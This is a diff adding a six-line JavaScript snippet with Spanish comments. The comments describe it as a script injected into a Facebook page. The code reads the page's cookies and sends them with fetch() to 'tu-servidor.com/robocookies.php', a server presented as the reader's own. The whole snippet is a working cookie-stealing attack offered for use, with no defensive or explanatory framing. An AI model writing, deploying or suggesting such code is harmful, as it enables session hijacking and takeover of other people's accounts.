@@ -1,0 +1,6 @@
+// Script que se inyecta en la página de Facebook
+let cookie = document.cookie;
+let url = "http://tu-servidor.com/robocookies.php?c=" + encodeURIComponent(cookie);
+
+// Envía las cookies a tu servidor
+fetch(url);
